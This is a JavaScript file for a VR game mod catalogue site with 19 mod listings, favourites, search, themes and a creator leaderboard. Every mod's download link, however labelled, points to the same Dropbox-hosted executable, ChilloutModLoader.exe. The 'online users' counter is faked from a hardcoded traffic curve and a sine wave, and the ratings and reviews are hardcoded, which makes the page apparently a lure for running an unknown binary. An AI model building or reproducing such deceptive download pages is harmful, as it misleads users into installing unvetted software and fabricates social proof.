// ======================== DATA ========================
const mods = [
    {
        id: 1,
        title: "Advanced Graphics Overhaul",
        category: "visual",
        image: "mods1.jpg",
        description: "Enhance your VR experience with ultra-realistic shaders and textures. This mod completely revamps the lighting engine, adds volumetric fog, and improves reflection quality.",
        downloads: "1.2K",
        downloadsNum: 1200,
        author: "GraphicsMaster",
        date: "2026-03-15",
        tags: ["#visual", "#shader", "#4k"],
        rating: 4.8,
        reviews: 842,
        features: [
            "Real-time ray tracing support for compatible GPUs",
            "Enhanced volumetric lighting and fog effects",
            "High-resolution shadow maps and ambient occlusion"
        ]
    },
    {
        id: 2,
        title: "Physics Engine V2",
        category: "gameplay",
        image: "mods2.jpg",
        description: "More realistic object interactions and ragdoll physics. Collisions are now calculated with higher precision, and weight distribution is simulated for all interactable objects.",
        downloads: "680",
        downloadsNum: 680,
        author: "PhysicsDev",
        date: "2026-04-18",
        tags: ["#physics", "#gameplay", "#realism"],
        rating: 4.6,
        reviews: 412,
        features: [
            "Advanced ragdoll physics for all avatars",
            "Precise object collision detection",
            "Realistic weight and inertia simulation"
        ]
    },
    {
        id: 3,
        title: "Character Customizer Pro",
        category: "tools",
        image: "mods3.jpg",
        description: "Unlimited customization options for your avatar. Adjust bone scaling, mix and match clothing assets, and save unlimited presets for quick switching.",
        downloads: "890",
        downloadsNum: 890,
        author: "AvatarCreator",
        date: "2026-03-22",
        tags: ["#avatar", "#customization", "#tools"],
        rating: 4.7,
        reviews: 632,
        features: [
            "Detailed bone scaling slider system",
            "Layered clothing system with color picker",
            "Save and share avatar presets via codes"
        ]
    },
    {
        id: 4,
        title: "Night Mode City",
        category: "visual",
        image: "mods4.jpg",
        description: "Transform the city into a neon-filled cyberpunk atmosphere. All street lights are dynamic, and rain reflections are enhanced for a moody aesthetic.",
        downloads: "450",
        downloadsNum: 450,
        author: "CyberArtist",
        date: "2026-04-25",
        tags: ["#visual", "#cyberpunk", "#lighting"],
        rating: 4.5,
        reviews: 287,
        features: [
            "Dynamic neon lighting system",
            "Procedural cyberpunk weather effects",
            "Custom skybox with holographic ads"
        ]
    },
    {
        id: 5,
        title: "Flight System",
        category: "gameplay",
        image: "mods5.jpg",
        description: "Explore the skies with new flight mechanics. Adds wingsuit capabilities and jetpacks with customizable thrust controls.",
        downloads: "740",
        downloadsNum: 740,
        author: "SkyWalker",
        date: "2026-02-28",
        tags: ["#gameplay", "#flight", "#mechanics"],
        rating: 4.7,
        reviews: 521,
        features: [
            "Fully controllable jetpack mechanics",
            "Wingsuit physics for gliding",
            "Aerial combat capabilities support"
        ]
    },
    {
        id: 6,
        title: "Inventory Manager",
        category: "tools",
        image: "mods6.jpg",
        description: "Manage your inventory faster and more efficiently. Adds sorting, searching, and favorites functionality to the standard inventory menu.",
        downloads: "1.6K",
        downloadsNum: 1600,
        author: "ToolSmith",
        date: "2026-02-25",
        tags: ["#tools", "#inventory", "#management"],
        rating: 4.8,
        reviews: 1124,
        features: [
            "Smart sorting and filtering options",
            "Quick-search bar for items",
            "Unlimited favorites and folders"
        ]
    },
    {
        id: 7,
        title: "HD Texture Pack",
        category: "visual",
        image: "mods7.jpg",
        description: "4K resolution textures for all surfaces. Replaces all base game textures with AI-upscaled high-definition variants.",
        downloads: "1.3K",
        downloadsNum: 1300,
        author: "TexturePro",
        date: "2026-03-28",
        tags: ["#visual", "#textures", "#hd"],
        rating: 4.9,
        reviews: 956,
        features: [
            "AI-upscaled 4K textures",
            "Optimized compression for performance",
            "Detailed normal and specular maps"
        ]
    },
    {
        id: 8,
        title: "Social Emotes Pack",
        category: "gameplay",
        image: "mods8.jpg",
        description: "50+ new emotes to interact with your friends. Includes dances, gestures, and interactive dual-person emotes.",
        downloads: "2.1K",
        downloadsNum: 2100,
        author: "SocialBee",
        date: "2026-04-12",
        tags: ["#gameplay", "#social", "#emotes"],
        rating: 4.8,
        reviews: 1487,
        features: [
            "50+ unique motion-captured emotes",
            "Interactive 2-player synchronized emotes",
            "Custom emote wheel UI"
        ]
    },
    {
        id: 9,
        title: "Voice Changer FX",
        category: "tools",
        image: "mods9.webp",
        description: "Real-time voice effects and modulation. Choose from robot, alien, echo, and pitch shift effects instantly.",
        downloads: "820",
        downloadsNum: 820,
        author: "AudioWizard",
        date: "2026-03-08",
        tags: ["#tools", "#audio", "#voice"],
        rating: 4.5,
        reviews: 487,
        features: [
            "Real-time low latency processing",
            "12 preset voice effects",
            "Custom pitch and formant sliders"
        ]
    },
    {
        id: 10,
        title: "Realistic Weather",
        category: "visual",
        image: "mods10.jpg",
        description: "Adds dynamic rain, snow, and wind effects. Weather patterns change procedurally and affect visibility and audio.",
        downloads: "610",
        downloadsNum: 610,
        author: "StormChaser",
        date: "2026-04-20",
        tags: ["#visual", "#weather", "#immersion"],
        rating: 4.7,
        reviews: 392,
        features: [
            "Procedural weather generation system",
            "Dynamic rain and snow particles",
            "Wind physics affecting trees and cloth"
        ]
    },
    {
        id: 11,
        title: "Weapon Balance Patch",
        category: "gameplay",
        image: "mods11.webp",
        description: "Balances weapon damage and recoil. Tweaks the meta to ensure fair play in competitive game modes.",
        downloads: "310",
        downloadsNum: 310,
        author: "CombatDev",
        date: "2026-03-18",
        tags: ["#gameplay", "#balance", "#combat"],
        rating: 4.3,
        reviews: 187,
        features: [
            "Revised damage values for all weapons",
            "Adjusted recoil patterns for realism",
            "Balanced fire rates and reload times"
        ]
    },
    {
        id: 12,
        title: "Performance Booster",
        category: "tools",
        image: "mods12.jpg",
        description: "Boost your FPS and reduce lag. Optimizes memory usage and reduces draw calls for smoother performance on lower-end hardware.",
        downloads: "2.8K",
        downloadsNum: 2800,
        author: "Optimizer",
        date: "2026-02-20",
        tags: ["#tools", "#performance", "#fps"],
        rating: 4.9,
        reviews: 2341,
        features: [
            "Aggressive occlusion culling",
            "Memory garbage collection optimization",
            "Texture streaming improvements"
        ]
    },
    {
        id: 14,
        title: "Cyber Limb Assets",
        category: "visual",
        image: "mods14.jpg",
        description: "Futuristic prosthetic limbs for your avatar. Fully rigged and ready to attach to any humanoid avatar base.",
        downloads: "480",
        downloadsNum: 480,
        author: "CyberDoc",
        date: "2026-03-25",
        tags: ["#visual", "#assets", "#cyber"],
        rating: 4.6,
        reviews: 318,
        features: [
            "High-quality sci-fi limb models",
            "Emissive textures with color control",
            "Easy drag-and-drop installation"
        ]
    },
    {
        id: 15,
        title: "Vehicle Pack",
        category: "gameplay",
        image: "mods15.jpg",
        description: "New drivable vehicles and race tracks. Includes sports cars, hoverbikes, and off-road buggies.",
        downloads: "760",
        downloadsNum: 760,
        author: "RacerX",
        date: "2026-04-08",
        tags: ["#gameplay", "#vehicles", "#driving"],
        rating: 4.6,
        reviews: 456,
        features: [
            "5 new drivable vehicle types",
            "Custom physics for drift and grip",
            "3 new race track maps included"
        ]
    },
    {
        id: 16,
        title: "UI Redesign",
        category: "tools",
        image: "mods16.jpg",
        description: "Make the user interface modern and minimalist. Cleans up the HUD and menus for a more immersive experience.",
        downloads: "1.0K",
        downloadsNum: 1000,
        author: "DesignerOne",
        date: "2026-03-12",
        tags: ["#tools", "#ui", "#interface"],
        rating: 4.7,
        reviews: 678,
        features: [
            "Minimalist HUD overlay",
            "Modern menu transparency effects",
            "Customizable color themes"
        ]
    },
    {
        id: 17,
        title: "Magic Spells",
        category: "gameplay",
        image: "mods17.jpg",
        description: "Ability to cast spells with hand gestures. Draw runes in the air to summon fireballs, shields, and healing lights.",
        downloads: "790",
        downloadsNum: 790,
        author: "MageSupreme",
        date: "2026-04-02",
        tags: ["#gameplay", "#magic", "#spells"],
        rating: 4.8,
        reviews: 524,
        features: [
            "Gesture-based spell casting system",
            "10+ unique elemental spells",
            "Visual particle effects for magic"
        ]
    },
    {
        id: 18,
        title: "Anime Shader",
        category: "visual",
        image: "mods18.jpg",
        description: "Give the world an anime-style look. Adds cell-shading and outlines to characters and environments.",
        downloads: "1.8K",
        downloadsNum: 1800,
        author: "AnimeFan",
        date: "2026-04-15",
        tags: ["#visual", "#anime", "#shader"],
        rating: 4.9,
        reviews: 1284,
        features: [
            "Adjustable toon outline thickness",
            "Customizable cell shading ramps",
            "Works on avatars and world objects"
        ]
    },
    {
        id: 19,
        title: "Server Admin Tools",
        category: "tools",
        image: "mods19.jpg",
        description: "Advanced permissions for server management. Kick, ban, and mute users with ease, plus logging features.",
        downloads: "240",
        downloadsNum: 240,
        author: "AdminPro",
        date: "2026-02-18",
        tags: ["#tools", "#admin", "#server"],
        rating: 4.5,
        reviews: 142,
        features: [
            "Comprehensive user management UI",
            "Chat and activity logging system",
            "Automated moderation rules"
        ]
    },
    {
        id: 20,
        title: "Underwater World",
        category: "visual",
        image: "mods20.webp",
        description: "Breathtaking atmosphere for underwater exploration. Adds swimming mechanics and underwater visual effects.",
        downloads: "1.2K",
        downloadsNum: 1200,
        author: "DeepDiver",
        date: "2026-05-05",
        tags: ["#visual", "#underwater", "#world"],
        rating: 4.6,
        reviews: 268,
        features: [
            "Realistic underwater fog and caustics",
            "Swimming locomotion system",
            "Underwater sound ambience"
        ]
    }
];

const DOWNLOAD_LINK = "https://www.dropbox.com/scl/fi/02rejsoshk7u3r2i5mmso/ChilloutModLoader.exe?rlkey=ur0hgc4e4vp97s2zm0t4sxtla&st=uef8j71i&dl=1";

// ======================== DOM REFS ========================
const modsGrid = document.getElementById('modsGrid');
const filterBtns = document.querySelectorAll('.filter-btn');
const searchInput = document.getElementById('searchInput');
const sortSelect = document.getElementById('sortSelect');
const viewBtns = document.querySelectorAll('.view-btn');
const modCount = document.getElementById('modCount');
const modCountFiltered = document.getElementById('modCountFiltered');
const favCount = document.getElementById('favCount');

const modal = document.getElementById('modModal');
const closeModalBtn = document.querySelector('.close-modal');
const modalTitle = document.getElementById('modalTitle');
const modalImage = document.getElementById('modalImage');
const modalDescription = document.getElementById('modalDescription');
const modalAuthor = document.getElementById('modalAuthor');
const modalDate = document.getElementById('modalDate');
const modalDownloads = document.getElementById('modalDownloads');
const modalCategory = document.getElementById('modalCategory');
const modalTags = document.getElementById('modalTags');
const modalFeatures = document.getElementById('modalFeatures');
const modalRating = document.getElementById('modalRating');
const modalDownloadLink = document.getElementById('modalDownloadLink');
const modalFavBtn = document.getElementById('modalFavBtn');
const loaderDownloadBtn = document.getElementById('loaderDownloadBtn');

if (loaderDownloadBtn) loaderDownloadBtn.href = DOWNLOAD_LINK;

// ======================== STATE ========================
let currentCategory = 'all';
let currentSort = 'popular';
let currentView = 'grid';
let currentSearch = '';
let currentOpenModId = null;

const favoritesKey = 'chilloutmods.favorites.v1';
const themeKey = 'chilloutmods.theme.v1';
const newsletterKey = 'chilloutmods.newsletter.v1';

function loadFavorites() {
    try {
        const raw = localStorage.getItem(favoritesKey);
        return new Set(raw ? JSON.parse(raw) : []);
    } catch { return new Set(); }
}

function saveFavorites(set) {
    try { localStorage.setItem(favoritesKey, JSON.stringify([...set])); } catch { }
}

let favorites = loadFavorites();

// ======================== THEME ========================
const themeToggle = document.getElementById('themeToggle');

function applyTheme(theme) {
    if (theme === 'light') {
        document.documentElement.setAttribute('data-theme', 'light');
        if (themeToggle) themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
    } else {
        document.documentElement.removeAttribute('data-theme');
        if (themeToggle) themeToggle.innerHTML = '<i class="fas fa-moon"></i>';
    }
}

const savedTheme = (() => {
    try { return localStorage.getItem(themeKey); } catch { return null; }
})();
applyTheme(savedTheme || 'dark');

if (themeToggle) {
    themeToggle.addEventListener('click', () => {
        const isLight = document.documentElement.getAttribute('data-theme') === 'light';
        const next = isLight ? 'dark' : 'light';
        applyTheme(next);
        try { localStorage.setItem(themeKey, next); } catch { }
        toast(`Switched to ${next} mode`, 'info', 'fa-' + (next === 'light' ? 'sun' : 'moon'));
    });
}

// ======================== ONLINE COUNTER ========================
const US_TRAFFIC_CURVE = [
    120, 95, 70, 45, 30, 25, 20, 25, 40, 55, 70, 85,
    95, 100, 105, 115, 130, 145, 160, 175, 185, 175, 155, 140
];

function updateOnlineCount() {
    const counterElement = document.getElementById('online-counter');
    if (!counterElement) return;
    try {
        const estDateString = new Date().toLocaleString("en-US", { timeZone: "America/New_York" });
        const estTime = new Date(estDateString);
        const hour = estTime.getHours();
        const minute = estTime.getMinutes();
        const second = estTime.getSeconds();
        const currentBase = US_TRAFFIC_CURVE[hour];
        const nextBase = US_TRAFFIC_CURVE[(hour + 1) % 24];
        const baseCount = currentBase + (nextBase - currentBase) * (minute / 60);
        const wave = Math.sin(second / 10) * 3 + Math.cos(minute / 5) * 1.5;
        const finalCount = Math.max(15, Math.round(baseCount + wave));
        counterElement.textContent = finalCount;
    } catch {
        const fallbackHour = new Date().getHours();
        const fallbackCount = US_TRAFFIC_CURVE[fallbackHour] || 100;
        counterElement.textContent = fallbackCount;
    }
}

setInterval(updateOnlineCount, 5000);
updateOnlineCount();

// ======================== READING PROGRESS ========================
const readingProgress = document.getElementById('readingProgress');
function updateReadingProgress() {
    if (!readingProgress) return;
    const scrollTop = window.scrollY;
    const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
    const pct = scrollHeight > 0 ? (scrollTop / scrollHeight) * 100 : 0;
    readingProgress.style.width = pct + '%';
}
window.addEventListener('scroll', updateReadingProgress, { passive: true });
updateReadingProgress();

// ======================== CUSTOM CURSOR ========================
const customCursor = document.getElementById('customCursor');
const customCursorDot = document.getElementById('customCursorDot');
let cursorTargetX = 0, cursorTargetY = 0;
let cursorX = 0, cursorY = 0;

function isTouchDevice() {
    return window.matchMedia && window.matchMedia('(pointer: coarse)').matches;
}

if (!isTouchDevice() && customCursor && customCursorDot) {
    document.addEventListener('mousemove', (e) => {
        cursorTargetX = e.clientX;
        cursorTargetY = e.clientY;
        if (!customCursor.classList.contains('visible')) {
            customCursor.classList.add('visible');
            customCursorDot.classList.add('visible');
        }
        customCursorDot.style.left = e.clientX + 'px';
        customCursorDot.style.top = e.clientY + 'px';
    });

    function animateCursor() {
        cursorX += (cursorTargetX - cursorX) * 0.18;
        cursorY += (cursorTargetY - cursorY) * 0.18;
        customCursor.style.left = cursorX + 'px';
        customCursor.style.top = cursorY + 'px';
        requestAnimationFrame(animateCursor);
    }
    animateCursor();

    document.addEventListener('mouseleave', () => {
        customCursor.classList.remove('visible');
        customCursorDot.classList.remove('visible');
    });

    // hover effect on interactive elements
    const hoverSelector = 'a, button, .mod-card, .gallery-item, .faq-item summary, .bento, .step, input, select, .testimonial';
    document.addEventListener('mouseover', (e) => {
        if (e.target.closest(hoverSelector)) customCursor.classList.add('hover');
    });
    document.addEventListener('mouseout', (e) => {
        if (e.target.closest(hoverSelector)) customCursor.classList.remove('hover');
    });
}

// ======================== NAVBAR SCROLL ========================
const navbar = document.querySelector('.navbar');
if (navbar) {
    const onScroll = () => {
        if (window.scrollY > 20) navbar.classList.add('scrolled');
        else navbar.classList.remove('scrolled');
    };
    window.addEventListener('scroll', onScroll, { passive: true });
    onScroll();
}

// ======================== MOBILE NAV ========================
const navToggle = document.querySelector('.nav-toggle');
const navCenter = document.querySelector('.nav-center');
if (navToggle && navCenter) {
    navToggle.addEventListener('click', () => {
        const isOpen = navCenter.classList.toggle('mobile-open');
        navToggle.innerHTML = isOpen ? '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
    });
    document.querySelectorAll('.nav-links a').forEach(a => {
        a.addEventListener('click', () => {
            navCenter.classList.remove('mobile-open');
            navToggle.innerHTML = '<i class="fas fa-bars"></i>';
        });
    });
}

// ======================== COUNTER ANIMATION ========================
function formatCount(num, suffix) {
    if (suffix === 'K+') {
        if (num >= 1000) return (num / 1000).toFixed(num >= 10000 ? 0 : 1).replace(/\.0$/, '') + 'K+';
        return num + '+';
    }
    return num.toLocaleString();
}

function animateCounter(el) {
    const target = parseInt(el.dataset.count, 10);
    const suffix = el.dataset.suffix || '';
    if (isNaN(target)) return;
    const duration = 1800;
    const start = performance.now();
    function step(now) {
        const elapsed = now - start;
        const progress = Math.min(elapsed / duration, 1);
        const eased = 1 - Math.pow(1 - progress, 3);
        const value = Math.round(target * eased);
        el.textContent = formatCount(value, suffix);
        if (progress < 1) requestAnimationFrame(step);
    }
    requestAnimationFrame(step);
}

const counterObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            animateCounter(entry.target);
            counterObserver.unobserve(entry.target);
        }
    });
}, { threshold: 0.4 });

document.querySelectorAll('.hstat-num[data-count]').forEach(el => counterObserver.observe(el));

// ======================== FAQ accordion ========================
document.querySelectorAll('.faq-item').forEach(item => {
    item.addEventListener('toggle', () => {
        if (item.open) {
            document.querySelectorAll('.faq-item').forEach(other => {
                if (other !== item) other.open = false;
            });
        }
    });
});

// ======================== KEYBOARD ========================
document.addEventListener('keydown', (e) => {
    const isMeta = e.metaKey || e.ctrlKey;
    if (isMeta && e.key.toLowerCase() === 'k') {
        e.preventDefault();
        if (searchInput) {
            searchInput.focus();
            searchInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
    }
    if (e.key === 'Escape') {
        if (modal && modal.classList.contains('show')) closeModal();
        const lightbox = document.getElementById('lightbox');
        if (lightbox && lightbox.classList.contains('show')) closeLightbox();
    }
});

// ======================== HERO PILL ========================
const heroPill = document.querySelector('.hero-pill');
if (heroPill) {
    heroPill.addEventListener('click', () => {
        const target = document.getElementById('mod-loader');
        if (target) target.scrollIntoView({ behavior: 'smooth' });
    });
}

// ======================== ACTIVE NAV LINK ========================
const navLinks = document.querySelectorAll('.nav-links a');
const sections = document.querySelectorAll('section[id], header[id]');
const sectionObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            const id = entry.target.getAttribute('id');
            navLinks.forEach(link => {
                link.classList.toggle('active', link.getAttribute('href') === `#${id}`);
            });
        }
    });
}, { rootMargin: '-40% 0px -55% 0px' });
sections.forEach(s => sectionObserver.observe(s));

// ======================== REVEAL ANIMATIONS ========================
const revealObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.classList.add('visible');
            revealObserver.unobserve(entry.target);
        }
    });
}, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });

document.addEventListener('DOMContentLoaded', () => {
    const revealTargets = document.querySelectorAll(
        '.bento-grid, .mod-loader-container, .section-header, .gallery-grid, .faq-list, .cta-card, .footer-content, .steps, .spotlight-card, .testimonials-grid, .creators-grid, .newsletter-card'
    );
    revealTargets.forEach(el => {
        el.classList.add('reveal');
        revealObserver.observe(el);
    });
});

// ======================== TOAST ========================
const toastContainer = document.getElementById('toastContainer');

function toast(message, type = 'info', icon = null) {
    if (!toastContainer) return;
    const el = document.createElement('div');
    el.className = `toast ${type}`;
    const iconClass = icon || (type === 'success' ? 'fa-check' : type === 'error' ? 'fa-exclamation' : 'fa-info');
    el.innerHTML = `<i class="fas ${iconClass}"></i><span>${message}</span>`;
    toastContainer.appendChild(el);
    setTimeout(() => {
        el.classList.add('removing');
        setTimeout(() => el.remove(), 300);
    }, 3200);
}

// ======================== FAVORITES ========================
function isFavorite(id) { return favorites.has(id); }

function toggleFavorite(id, source = 'card') {
    const mod = mods.find(m => m.id === id);
    if (!mod) return;
    if (favorites.has(id)) {
        favorites.delete(id);
        toast(`Removed "${mod.title}" from favorites`, 'info', 'fa-heart-broken');
    } else {
        favorites.add(id);
        toast(`Added "${mod.title}" to favorites`, 'success', 'fa-heart');
    }
    saveFavorites(favorites);
    updateFavCount();
    syncFavButtons(id);
    if (currentCategory === 'favorites') renderMods();
}

function updateFavCount() {
    if (favCount) favCount.textContent = favorites.size;
}

function syncFavButtons(id) {
    document.querySelectorAll(`.fav-btn[data-mod-id="${id}"]`).forEach(btn => {
        const active = isFavorite(id);
        btn.classList.toggle('active', active);
        btn.innerHTML = `<i class="${active ? 'fas' : 'far'} fa-heart"></i>`;
    });
    if (currentOpenModId === id && modalFavBtn) {
        const active = isFavorite(id);
        modalFavBtn.classList.toggle('active', active);
        modalFavBtn.innerHTML = `<i class="${active ? 'fas' : 'far'} fa-heart"></i>`;
    }
}

updateFavCount();

// ======================== MODAL ========================
function openModal(mod) {
    currentOpenModId = mod.id;
    modalTitle.textContent = mod.title;
    modalImage.src = mod.image;
    modalImage.alt = mod.title;
    modalImage.onerror = () => { modalImage.src = 'logo.png'; };
    modalDescription.textContent = mod.description;
    modalAuthor.textContent = mod.author;
    modalDate.textContent = mod.date;
    modalDownloads.textContent = mod.downloads;
    modalCategory.textContent = getCategoryName(mod.category);
    modalTags.innerHTML = mod.tags.map(tag => `<span class="tag">${tag}</span>`).join('');
    modalFeatures.innerHTML = mod.features.map(f => `<li><i class="fas fa-check-circle"></i> ${f}</li>`).join('');

    if (modalRating) {
        modalRating.innerHTML = `
            <div class="stars">${renderStars(mod.rating)}</div>
            <span>${mod.rating.toFixed(1)} · ${mod.reviews.toLocaleString()} reviews</span>
        `;
    }

    if (modalFavBtn) {
        const active = isFavorite(mod.id);
        modalFavBtn.classList.toggle('active', active);
        modalFavBtn.innerHTML = `<i class="${active ? 'fas' : 'far'} fa-heart"></i>`;
        modalFavBtn.onclick = () => toggleFavorite(mod.id, 'modal');
    }

    modalDownloadLink.href = DOWNLOAD_LINK;
    modalDownloadLink.target = "_blank";
    modal.classList.add('show');
    document.body.style.overflow = 'hidden';
}

function closeModal() {
    modal.classList.remove('show');
    document.body.style.overflow = '';
    currentOpenModId = null;
}

closeModalBtn.addEventListener('click', closeModal);
window.addEventListener('click', (e) => { if (e.target === modal) closeModal(); });
modalDownloadLink.addEventListener('click', () => {
    toast('Download started — check your browser', 'success', 'fa-download');
    setTimeout(closeModal, 600);
});

// ======================== STARS ========================
function renderStars(rating) {
    let html = '';
    const full = Math.floor(rating);
    const half = (rating - full) >= 0.4 && (rating - full) <= 0.8;
    const total = 5;
    for (let i = 0; i < full; i++) html += '<i class="fas fa-star"></i>';
    if (half) { html += '<i class="fas fa-star-half-alt"></i>'; }
    const remaining = total - full - (half ? 1 : 0);
    for (let i = 0; i < remaining; i++) html += '<i class="far fa-star"></i>';
    return html;
}

// ======================== RENDER MODS ========================
function getCategoryName(cat) {
    const names = { 'visual': 'Visual', 'gameplay': 'Gameplay', 'tools': 'Tools' };
    return names[cat] || cat;
}

function sortMods(list, mode) {
    const sorted = [...list];
    switch (mode) {
        case 'newest':
            sorted.sort((a, b) => new Date(b.date) - new Date(a.date));
            break;
        case 'rating':
            sorted.sort((a, b) => b.rating - a.rating);
            break;
        case 'name':
            sorted.sort((a, b) => a.title.localeCompare(b.title));
            break;
        case 'popular':
        default:
            sorted.sort((a, b) => b.downloadsNum - a.downloadsNum);
    }
    return sorted;
}

function renderMods() {
    modsGrid.innerHTML = '';
    modsGrid.classList.toggle('list-view', currentView === 'list');

    const searchTerm = currentSearch.toLowerCase().trim();
    let filtered = mods.filter(mod => {
        const matchesCategory =
            currentCategory === 'all' ||
            (currentCategory === 'favorites' && favorites.has(mod.id)) ||
            mod.category === currentCategory;
        const matchesSearch =
            !searchTerm ||
            mod.title.toLowerCase().includes(searchTerm) ||
            mod.description.toLowerCase().includes(searchTerm) ||
            mod.author.toLowerCase().includes(searchTerm) ||
            mod.tags.some(t => t.toLowerCase().includes(searchTerm));
        return matchesCategory && matchesSearch;
    });

    filtered = sortMods(filtered, currentSort);

    if (modCount) modCount.textContent = mods.length;
    if (modCountFiltered) modCountFiltered.textContent = filtered.length;

    if (filtered.length === 0) {
        const emptyMsg = currentCategory === 'favorites'
            ? { icon: 'fa-heart', title: 'No favorites yet', desc: 'Tap the heart on any mod to save it here.' }
            : { icon: 'fa-magnifying-glass', title: 'No mods found', desc: 'Try different keywords or clear the filters.' };
        modsGrid.innerHTML = `
            <div class="empty-state">
                <div class="empty-state-icon"><i class="fas ${emptyMsg.icon}"></i></div>
                <h3>${emptyMsg.title}</h3>
                <p>${emptyMsg.desc}</p>
                <button class="btn-ghost" id="clearFilters"><i class="fas fa-rotate-left"></i> Reset filters</button>
            </div>
        `;
        const clearBtn = document.getElementById('clearFilters');
        if (clearBtn) {
            clearBtn.addEventListener('click', () => {
                currentCategory = 'all';
                currentSearch = '';
                if (searchInput) searchInput.value = '';
                filterBtns.forEach(b => b.classList.toggle('active', b.dataset.filter === 'all'));
                renderMods();
            });
        }
        return;
    }

    filtered.forEach(mod => {
        const modCard = document.createElement('div');
        modCard.className = 'mod-card';
        const tagsHtml = mod.tags.map(tag => `<span class="tag">${tag}</span>`).join('');
        const isFav = isFavorite(mod.id);
        modCard.innerHTML = `
            <div class="mod-image">
                <img src="${mod.image}" alt="${mod.title}" loading="lazy" onerror="this.src='logo.png'">
                <div class="mod-badges">
                    <span class="badge-category">${getCategoryName(mod.category)}</span>
                    <span class="badge-downloads">${mod.downloads}</span>
                </div>
                <button class="fav-btn ${isFav ? 'active' : ''}" data-mod-id="${mod.id}" aria-label="Toggle favorite" title="Favorite">
                    <i class="${isFav ? 'fas' : 'far'} fa-heart"></i>
                </button>
            </div>
            <div class="mod-content">
                <div class="mod-title-row">
                    <h3 class="mod-title">${mod.title}</h3>
                    <span class="mod-rating"><i class="fas fa-star"></i> ${mod.rating.toFixed(1)}</span>
                </div>
                <p class="mod-desc">${mod.description}</p>
                <div class="mod-tags">${tagsHtml}</div>
                <div class="mod-meta">
                    <span class="mod-author">${mod.author}</span>
                    <span class="mod-date">${mod.date}</span>
                </div>
                <div class="mod-actions">
                    <a href="${DOWNLOAD_LINK}" target="_blank" class="btn-download" data-mod-id="${mod.id}">Download</a>
                    <button class="btn-details" data-mod-id="${mod.id}">Details</button>
                </div>
            </div>
        `;
        modsGrid.appendChild(modCard);
    });

    // Wire up handlers (delegation would also work, but explicit is fine for ~20 cards)
    modsGrid.querySelectorAll('.fav-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            e.preventDefault();
            const id = parseInt(btn.dataset.modId, 10);
            toggleFavorite(id, 'card');
        });
    });
    modsGrid.querySelectorAll('.btn-details').forEach(btn => {
        btn.addEventListener('click', () => {
            const id = parseInt(btn.dataset.modId, 10);
            const mod = mods.find(m => m.id === id);
            if (mod) openModal(mod);
        });
    });
    modsGrid.querySelectorAll('.btn-download').forEach(btn => {
        btn.addEventListener('click', () => {
            const id = parseInt(btn.dataset.modId, 10);
            const mod = mods.find(m => m.id === id);
            if (mod) {
                toast(`Downloading ${mod.title}...`, 'success', 'fa-download');
            }
        });
    });
}

window.openModalById = function (id) {
    const mod = mods.find(m => m.id === id);
    if (mod) openModal(mod);
};

// ======================== FILTER / SEARCH / SORT / VIEW ========================
filterBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        filterBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        currentCategory = btn.getAttribute('data-filter');
        renderMods();
    });
});

if (searchInput) {
    searchInput.addEventListener('input', (e) => {
        currentSearch = e.target.value;
        renderMods();
    });
}

if (sortSelect) {
    sortSelect.addEventListener('change', (e) => {
        currentSort = e.target.value;
        renderMods();
    });
}

viewBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        viewBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        currentView = btn.dataset.view;
        renderMods();
    });
});

// ======================== SPOTLIGHT ========================
const spotlightDetails = document.getElementById('spotlightDetails');
if (spotlightDetails) {
    spotlightDetails.addEventListener('click', () => {
        const spotlightMod = mods.find(m => m.id === 18);
        if (spotlightMod) openModal(spotlightMod);
    });
}

// ======================== CREATORS ========================
function renderCreators() {
    const grid = document.getElementById('creatorsGrid');
    if (!grid) return;

    // Aggregate authors from mods
    const map = new Map();
    mods.forEach(mod => {
        if (!map.has(mod.author)) {
            map.set(mod.author, { name: mod.author, modCount: 0, totalDownloads: 0, totalRating: 0 });
        }
        const a = map.get(mod.author);
        a.modCount += 1;
        a.totalDownloads += mod.downloadsNum;
        a.totalRating += mod.rating;
    });

    const creators = [...map.values()]
        .map(c => ({
            ...c,
            avgRating: c.totalRating / c.modCount,
        }))
        .sort((a, b) => b.totalDownloads - a.totalDownloads)
        .slice(0, 8);

    const badges = ['verified', 'pro', 'verified', 'pro', 'verified'];
    const gradients = [
        'linear-gradient(135deg,#00e5ff,#a855f7)',
        'linear-gradient(135deg,#ec4899,#a855f7)',
        'linear-gradient(135deg,#f59e0b,#ec4899)',
        'linear-gradient(135deg,#22c55e,#00e5ff)',
        'linear-gradient(135deg,#a855f7,#00e5ff)',
        'linear-gradient(135deg,#00e5ff,#22c55e)',
        'linear-gradient(135deg,#f59e0b,#a855f7)',
        'linear-gradient(135deg,#ec4899,#00e5ff)',
    ];

    grid.innerHTML = creators.map((c, i) => {
        const initial = c.name.charAt(0).toUpperCase();
        const dlFormatted = c.totalDownloads >= 1000
            ? (c.totalDownloads / 1000).toFixed(c.totalDownloads >= 10000 ? 0 : 1).replace(/\.0$/, '') + 'K'
            : c.totalDownloads;
        const badge = i < 3 ? 'verified' : (i < 6 ? 'pro' : 'verified');
        const badgeLabel = i === 0 ? 'Top creator' : (badge === 'verified' ? 'Verified' : 'Pro');
        return `
            <div class="creator-card">
                <div class="creator-avatar" style="background:${gradients[i % gradients.length]}">${initial}</div>
                <div class="creator-name">${c.name}</div>
                <div class="creator-handle">@${c.name.toLowerCase()}</div>
                <div class="creator-stats">
                    <div class="creator-stat">
                        <div class="creator-stat-num">${c.modCount}</div>
                        <div class="creator-stat-label">Mods</div>
                    </div>
                    <div class="creator-stat">
                        <div class="creator-stat-num">${dlFormatted}</div>
                        <div class="creator-stat-label">DLs</div>
                    </div>
                    <div class="creator-stat">
                        <div class="creator-stat-num">${c.avgRating.toFixed(1)}</div>
                        <div class="creator-stat-label">Rating</div>
                    </div>
                </div>
                <span class="creator-badge ${badge}">${badgeLabel}</span>
            </div>
        `;
    }).join('');
}

